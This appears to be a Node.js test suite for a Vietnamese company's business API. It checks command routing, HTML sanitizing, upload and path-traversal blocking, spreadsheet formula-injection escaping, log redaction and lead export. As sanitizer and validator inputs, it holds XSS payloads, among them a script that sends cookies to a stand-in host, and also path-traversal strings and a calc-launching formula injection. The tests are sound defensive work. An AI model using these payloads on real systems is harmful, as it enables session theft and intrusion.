'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const fs = require('node:fs');
const Module = require('node:module');
const ts = require('typescript');

if (!require.extensions['.ts']) {
  require.extensions['.ts'] = function compileTs(module, filename) {
    const source = fs.readFileSync(filename, 'utf8');
    const transpiled = ts.transpileModule(source, {
      compilerOptions: {
        module: ts.ModuleKind.CommonJS,
        target: ts.ScriptTarget.ES2022,
        esModuleInterop: true,
        resolveJsonModule: true,
      },
      fileName: filename,
    });
    module._compile(transpiled.outputText, filename);
  };
}

const V2_ROOT = path.resolve(__dirname, '../../../../..');
const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function resolveWorkspaceAliases(request, parent, isMain, options) {
  if (request === '@toantrung/contracts') {
    return path.join(V2_ROOT, 'packages/contracts/src/common/index.ts');
  }
  if (request.startsWith('@toantrung/contracts/')) {
    const sub = request.slice('@toantrung/contracts/'.length);
    return path.join(V2_ROOT, 'packages/contracts/src', sub, 'index.ts');
  }
  if (request === '@toantrung/database') {
    return path.join(V2_ROOT, 'packages/database/src/index.ts');
  }
  try {
    return origResolveFilename.call(this, request, parent, isMain, options);
  } catch (err) {
    if (request.startsWith('.') && parent && parent.filename) {
      const candidateTs = path.resolve(path.dirname(parent.filename), `${request}.ts`);
      if (fs.existsSync(candidateTs)) return candidateTs;
      const candidateIndexTs = path.resolve(path.dirname(parent.filename), request, 'index.ts');
      if (fs.existsSync(candidateIndexTs)) return candidateIndexTs;
    }
    throw err;
  }
};

const { routeDesignCommand, validateCommandReadiness } = require(
  path.join(V2_ROOT, 'apps/api/src/modules/05-ai-design/command-router.ts')
);
const { sanitizeUntrustedReportHtml } = require(
  path.join(V2_ROOT, 'apps/api/src/core/security/html-sanitizer.ts')
);
const {
  savePrivateBusinessFile,
  resolvePrivateBusinessFilePath,
} = require(path.join(V2_ROOT, 'apps/api/src/core/storage/private-files.service.ts'));
const { ROLE_PERMISSION_MATRIX } = require(
  path.join(V2_ROOT, 'packages/contracts/src/common/index.ts')
);
const {
  sanitizeForFormulaInjection,
  sanitizeXlsxSheetName,
  buildStandardXlsxBuffer,
} = require(path.join(V2_ROOT, 'apps/api/src/core/export/xlsx-builder.ts'));
const {
  getOrComputeScopedCache,
  bumpDomainRevisions,
} = require(path.join(V2_ROOT, 'apps/api/src/core/cache/server-data-cache.ts'));
const {
  isValidCalendarYmd,
  getCustomCanonicalDateRange,
} = require(path.join(V2_ROOT, 'apps/api/src/core/reporting-dates.js'));
const { formatStructuredLogEntry } = require(
  path.join(V2_ROOT, 'apps/api/src/core/logging/logger.ts')
);
const { GET: getHealthRoute } = require(
  path.join(V2_ROOT, 'apps/api/src/app/api/v1/health/route.ts')
);
const { listDesignRequestsForUser } = require(
  path.join(V2_ROOT, 'apps/api/src/modules/05-ai-design/service.ts')
);
const { GET: getAuthMeRoute } = require(
  path.join(V2_ROOT, 'apps/api/src/app/api/v1/auth/me/route.ts')
);

test('UPG-20261123-01: M05 @banner, @baneer, @taobanner, @TaoAnhPoster, @taoanh routing & readiness', () => {
  const bannerAliases = [
    '@banner Khuyến mãi màn hình LED P2.5 hội trường 1920x1080',
    '@baneer Poster hội nghị khách hàng Toàn Trung 1080x1350',
    '@taobanner Banner quảng cáo bảng điện tử ngoài trời',
    '@tạobanner Banner sự kiện ra mắt showroom LED',
    '@TaoAnhPoster Poster giải pháp màn hình ghép',
  ];

  for (const msg of bannerAliases) {
    const routed = routeDesignCommand({ rawMessage: msg });
    assert.equal(
      routed.action,
      'GENERATE_BANNER',
      `Expected GENERATE_BANNER for "${msg}", got ${routed.action}`
    );
    assert.ok(routed.cleanInstruction.length > 5);

    const readiness = validateCommandReadiness({
      routed,
      hasSurveyPhoto: false,
      hasPlacementQuad: false,
    });
    assert.equal(readiness.canExecuteImmediately, true, `Banner command "${msg}" should be ready immediately`);
    assert.equal(readiness.effectiveAction, 'GENERATE_BANNER');
  }

  const perspectiveDecision = routeDesignCommand({
    rawMessage: '@taoanh Ghép màn hình LED P3 ngang 4.8m cao 2.7m vào mặt tiền',
  });
  assert.equal(perspectiveDecision.action, 'GENERATE_SCENE');
});

test('UPG-20261123-02: sanitizeUntrustedReportHtml strips XSS payloads while preserving safe report markup', () => {
  const malicious = `
    <h2>Báo cáo Toàn Trung</h2>
    <p onclick="alert(1)" style="color:red">Doanh số tăng <strong>25%</strong></p>
    <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
    <img src="x" onerror="alert('xss')" />
    <svg onload="alert('svg')"><circle r="10"/></svg>
    <iframe src="javascript:alert(2)"></iframe>
    <a href="javascript:alert(3)" target="_blank">Link độc hại</a>
    <a href="https://toantrung.com.vn/bao-cao">Link hợp lệ</a>
  `;
  const clean = sanitizeUntrustedReportHtml(malicious);

  assert.equal(clean.includes('<script'), false);
  assert.equal(clean.includes('onerror'), false);
  assert.equal(clean.includes('onclick'), false);
  assert.equal(clean.includes('onload'), false);
  assert.equal(clean.includes('<svg'), false);
  assert.equal(clean.includes('<iframe'), false);
  assert.equal(clean.includes('javascript:'), false);
  assert.equal(clean.includes('<h2>Báo cáo Toàn Trung</h2>'), true);
  assert.equal(clean.includes('<strong>25%</strong>'), true);
  assert.equal(clean.includes('href="https://toantrung.com.vn/bao-cao"'), true);
});

test('UPG-20261123-03: private-files.service blocks path traversal and disguised SVG/HTML/JS uploads', () => {
  assert.equal(resolvePrivateBusinessFilePath('../../package.json'), null);
  assert.equal(resolvePrivateBusinessFilePath('..\\..\\package.json'), null);
  assert.equal(resolvePrivateBusinessFilePath('/etc/passwd'), null);
  assert.equal(resolvePrivateBusinessFilePath('C:\\Windows\\win.ini'), null);

  assert.throws(
    () =>
      savePrivateBusinessFile({
        bucket: 'leads',
        originalFileName: 'xss.svg',
        declaredMimeType: 'image/svg+xml',
        fileBuffer: Buffer.from('<svg onload="alert(1)"></svg>', 'utf8'),
      }),
    /Định dạng tệp không được phép tải lên/
  );

  assert.throws(
    () =>
      savePrivateBusinessFile({
        bucket: 'leads',
        originalFileName: 'disguised.png',
        declaredMimeType: 'image/png',
        fileBuffer: Buffer.from('<!DOCTYPE html><script>alert(1)</script>', 'utf8'),
      }),
    /Định dạng tệp không được phép tải lên/
  );
});

test('UPG-20261123-04: BA ROLE_PERMISSION_MATRIX excludes TRACKING_ADS_OPTIMIZE from BOD', () => {
  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('TRACKING_ADS_OPTIMIZE'), false);
  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('DASHBOARD_VIEW'), true);
  assert.equal(ROLE_PERMISSION_MATRIX.BOD.includes('EXPORT_DATA'), true);
  assert.equal(ROLE_PERMISSION_MATRIX.MKT_LEAD.includes('TRACKING_ADS_OPTIMIZE'), true);
});

test('UPG-20261123-05: xlsx-builder neutralizes formula injection (including leading whitespace) and truncates/dedupes sheet names', () => {
  assert.equal(sanitizeForFormulaInjection('=cmd|\'/C calc\'!A0'), "'=cmd|'/C calc'!A0");
  assert.equal(sanitizeForFormulaInjection('  \t+SUM(A1:A2)'), "'  \t+SUM(A1:A2)");
  assert.equal(sanitizeForFormulaInjection('-100+200'), "'-100+200");
  assert.equal(sanitizeForFormulaInjection('@HYPERLINK("http://evil")'), "'@HYPERLINK(\"http://evil\")");
  assert.equal(sanitizeForFormulaInjection('Báo cáo bình thường'), 'Báo cáo bình thường');

  const used = new Set();
  const s1 = sanitizeXlsxSheetName('Báo cáo: Doanh số [Q4/2026]*?\\Chi tiết rất dài vượt 31 ký tự', used);
  const s2 = sanitizeXlsxSheetName('Báo cáo: Doanh số [Q4/2026]*?\\Chi tiết rất dài vượt 31 ký tự', used);
  assert.ok(s1.length <= 31, `Sheet name length ${s1.length} must be <= 31`);
  assert.ok(s2.length <= 31, `Duplicate sheet name length ${s2.length} must be <= 31`);
  assert.notEqual(s1, s2);
  assert.equal(/[:\\/?*\[\]]/.test(s1), false);

  const buf = buildStandardXlsxBuffer([
    {
      name: 'Báo cáo: [1] / Rất dài vượt quá giới hạn 31 ký tự chuẩn Excel',
      title: 'Báo cáo Kiểm chứng Toàn Trung',
      columns: [
        { key: 'name', header: 'Tên' },
        { key: 'formula', header: 'Công thức' },
      ],
      rows: [{ name: 'Khách A', formula: '=1+1' }],
    },
  ]);
  assert.ok(Buffer.isBuffer(buf) && buf.length > 100);
});

test('UPG-20261123-06: server-data-cache invalidates multi-domain inflight keys and reporting-dates rejects rollover dates', async () => {
  assert.equal(isValidCalendarYmd('2026-11-23'), true);
  assert.equal(isValidCalendarYmd('2026-02-31'), false);
  assert.equal(isValidCalendarYmd('2026-04-31'), false);

  const fallbackRange = getCustomCanonicalDateRange('2026-02-31', '2026-11-23');
  assert.notEqual(fallbackRange.startDateStr, '2026-02-31');

  let calls = 0;
  const val1 = await getOrComputeScopedCache({
    domains: ['ads', 'leads'],
    key: 'upg-test-multi-domain',
    ttlMs: 30_000,
    compute: async () => {
      calls += 1;
      return { count: calls };
    },
  });
  assert.equal(val1.data.count, 1);

  bumpDomainRevisions(['leads'], 'test_lead_mutation');

  const val2 = await getOrComputeScopedCache({
    domains: ['ads', 'leads'],
    key: 'upg-test-multi-domain',
    ttlMs: 30_000,
    compute: async () => {
      calls += 1;
      return { count: calls };
    },
  });
  assert.equal(val2.data.count, 2);
});

test('UPG-20261123-07: formatStructuredLogEntry redacts sensitive secrets and preserves requestId', () => {
  const entry = formatStructuredLogEntry('error', 'http', 'Sample failure', {
    requestId: 'req-123',
    apiKey: 'sk-secret-key-999',
    nested: {
      refreshToken: 'rt-secret',
      password: 'my-password',
      safeField: 'visible',
    },
  });
  assert.equal(entry.requestId, 'req-123');
  assert.equal(entry.apiKey, '[REDACTED]');
  assert.equal(entry.nested.refreshToken, '[REDACTED]');
  assert.equal(entry.nested.password, '[REDACTED]');
  assert.equal(entry.nested.safeField, 'visible');
});

test('UPG-20261123-08: GET /api/v1/health returns 200 healthy without leaking filesystem paths', async () => {
  const res = await getHealthRoute();
  assert.equal(res.status, 200);
  const body = await res.json();
  assert.equal(body.ok, true);
  assert.equal(body.status, 'healthy');
  assert.equal(body.checks.database, 'ok');
  assert.equal(body.checks.storage, 'ok');
  assert.equal(typeof body.uptimeSec, 'number');
  const serialized = JSON.stringify(body);
  assert.equal(serialized.includes('storage_independent_v2'), false);
  assert.equal(serialized.includes('DATABASE_URL'), false);
});

test('UPG-20261123-09: listDesignRequestsForUser returns pagination metadata and respects pageSize', async () => {
  const res = await listDesignRequestsForUser(
    {
      id: 1,
      email: 'admin@toantrung.vn',
      fullName: 'Admin',
      roleCode: 'ADMIN',
      department: 'admin',
      csrfToken: 'test-csrf',
      avatarUrl: null,
      coverUrl: null,
      isReceivingLeads: false,
      permissions: ['AI_DESIGN', 'SYSTEM_USER_ADMIN'],
    },
    { page: 1, pageSize: 5 }
  );
  assert.ok(res.pagination);
  assert.equal(res.pagination.page, 1);
  assert.equal(res.pagination.pageSize, 5);
  assert.equal(typeof res.pagination.totalCount, 'number');
  assert.ok(res.requests.length <= 5);
});

test('UPG-20261123-10: GET /api/v1/auth/me?optional=1 returns 200 null user while strict mode keeps 401', async () => {
  const optRes = await getAuthMeRoute(new Request('http://localhost:3000/api/v1/auth/me?optional=1'));
  assert.equal(optRes.status, 200);
  const optBody = await optRes.json();
  assert.equal(optBody.ok, true);
  assert.equal(optBody.data.user, null);
  assert.equal(optBody.data.authenticated, false);

  const strictRes = await getAuthMeRoute(new Request('http://localhost:3000/api/v1/auth/me'));
  assert.equal(strictRes.status, 401);
});

const {
  recordTrackingTouchpoint,
  getStoredTouchpoints,
} = require(path.join(V2_ROOT, 'apps/api/src/modules/02-tracking-sync/service.ts'));
const { prisma } = require(path.join(V2_ROOT, 'packages/database/src/index.ts'));
const leadsService = require(path.join(V2_ROOT, 'apps/api/src/modules/01-leads/service.ts'));

test('UPG-20261124-11: 20 concurrent recordTrackingTouchpoint events with distinct eventIds all succeed and all 20 are saved without lost updates', async () => {
  const settingRowBefore = await prisma.systemSetting.findUnique({
    where: { key: 'tracking_touchpoints_v1' },
  });
  const backupValue = settingRowBefore ? settingRowBefore.value : null;

  try {
    const batchTag = `CONC-${Date.now()}`;
    const eventIds = Array.from({ length: 20 }, (_, idx) => `${batchTag}-EVT-${String(idx + 1).padStart(2, '0')}`);

    const results = await Promise.all(
      eventIds.map((eventId, idx) =>
        recordTrackingTouchpoint({
          eventId,
          eventType: idx % 2 === 0 ? 'product_view' : 'contact_click',
          sourceWebsite: 'toantrung.com.vn',
          pageUrl: `https://toantrung.com.vn/test-${idx + 1}`,
          visitorId: `vis-${idx + 1}`,
        })
      )
    );

    assert.equal(results.length, 20);
    for (const r of results) {
      assert.equal(r.ok, true);
      assert.equal(r.deduplicated, false);
    }

    const stored = await getStoredTouchpoints();
    const savedEventIds = new Set(stored.map((item) => item.eventId));
    for (const id of eventIds) {
      assert.equal(savedEventIds.has(id), true, `Expected concurrent touchpoint ${id} to be persisted`);
    }
  } finally {
    if (backupValue !== null) {
      await prisma.systemSetting.upsert({
        where: { key: 'tracking_touchpoints_v1' },
        update: { value: backupValue },
        create: { key: 'tracking_touchpoints_v1', value: backupValue },
      });
    } else {
      await prisma.systemSetting.deleteMany({
        where: { key: 'tracking_touchpoints_v1' },
      });
    }
  }
});

test('UPG-20261124-12: exportAllLeadsForUser exports all 5,001 matching leads without truncating at 5,000', async () => {
  const TOTAL_SYNTHETIC_LEADS = 5001;
  const origFindMany = prisma.lead.findMany;
  const origCount = prisma.lead.count;

  const now = new Date();
  const makeFakeLeadRow = (index) => ({
    id: 900000 + index,
    leadCode: `TT-20261124-${String(index).padStart(5, '0')}`,
    version: 1,
    contactName: `Khách giả lập ${index}`,
    companyName: `Công ty Kiểm thử ${index}`,
    projectName: `Dự án LED ${index}`,
    phone: `090${String(1000000 + index).slice(-7)}`,
    email: `lead${index}@example.test`,
    isPhoneUnstandardized: false,
    contactChannel: 'form_web',
    sourceWebsite: 'toantrung.com.vn',
    selfReportedSource: 'Google',
    areaType: 'tphcm',
    district: 'Quận 10',
    province: 'TP. Hồ Chí Minh',
    installationAddress: 'Địa chỉ giả lập',
    assignedSalesId: 1,
    assignedSales: { id: 1, fullName: 'Sales Test' },
    createdBy: null,
    receivedBy: null,
    matchedOldLead: null,
    matchedOldLeadId: null,
    receivedAt: null,
    pipelineStatus: 'new_lead',
    lostReason: null,
    firstQuoteSentAt: null,
    quoteRespondedAt: null,
    isDuplicateAlert: false,
    duplicateStatus: 'none',
    isSuspectedPriceCheck: false,
    isSpam: false,
    spamAdsExclusionStatus: 'none',
    spamReason: null,
    needsManagerAttention: false,
    createdByActorType: 'webhook',
    createdByActorRef: 'website_webhook:toantrung.com.vn',
    contactedAt: now,
    createdAt: now,
    updatedAt: now,
    leadProducts: [],
    tracking: null,
    attachments: [],
    activities: [],
    designRequests: [],
  });

  prisma.lead.count = async () => TOTAL_SYNTHETIC_LEADS;
  prisma.lead.findMany = async (args = {}) => {
    const skip = args.skip || 0;
    const take = args.take || 50;
    const end = Math.min(skip + take, TOTAL_SYNTHETIC_LEADS);
    const slice = [];
    for (let i = skip; i < end; i++) {
      slice.push(makeFakeLeadRow(i + 1));
    }
    return slice;
  };

  try {
    bumpDomainRevisions(['leads'], 'test_5001_export');
    const exported = await leadsService.exportAllLeadsForUser(
      {
        id: 1,
        email: 'admin@toantrung.vn',
        fullName: 'Admin',
        roleCode: 'ADMIN',
        roleName: 'Quản trị viên',
        department: 'admin',
        csrfToken: 'test-csrf',
        avatarUrl: null,
        coverUrl: null,
        isReceivingLeads: false,
        permissions: ['LEAD_VIEW_ALL', 'EXPORT_DATA'],
      },
      { search: 'SYNTHETIC_5001_FILTER' }
    );

    assert.equal(exported.totalCount, 5001);
    assert.equal(exported.leads.length, 5001);
    assert.equal(exported.leads[0].leadCode, 'TT-20261124-00001');
    assert.equal(exported.leads[5000].leadCode, 'TT-20261124-05001');
  } finally {
    prisma.lead.findMany = origFindMany;
    prisma.lead.count = origCount;
    bumpDomainRevisions(['leads'], 'restore_after_5001_export');
  }
});

test('UPG-20261124-13: package.json build/start scripts do not invoke db:seed and seed.js blocks default password in production', () => {
  const pkgJson = JSON.parse(fs.readFileSync(path.join(V2_ROOT, 'package.json'), 'utf8'));
  assert.equal(pkgJson.scripts.build.includes('db:seed'), false, 'build script must not invoke db:seed');
  assert.equal(pkgJson.scripts.start.includes('db:seed'), false, 'start script must not invoke db:seed');

  const seedSource = fs.readFileSync(path.join(V2_ROOT, 'packages/database/scripts/seed.js'), 'utf8');
  assert.equal(
    seedSource.includes("process.env.NODE_ENV === 'production'"),
    true,
    'seed.js must guard account seeding when NODE_ENV === production'
  );
});
